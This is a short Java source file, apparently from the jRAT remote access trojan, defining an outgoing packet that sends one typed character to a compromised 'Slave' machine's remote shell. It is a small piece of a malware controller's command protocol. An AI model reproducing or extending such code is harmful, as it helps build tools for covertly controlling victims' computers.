package se.jrat.controller.packets.outgoing;

import java.io.DataOutputStream;

import se.jrat.controller.Slave;


public class Packet22RemoteShellTyped extends AbstractOutgoingPacket {

	private char c;

	public Packet22RemoteShellTyped(char c) {
		this.c = c;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		dos.writeChar(c);
	}

	@Override
	public short getPacketId() {
		return 22;
	}

}
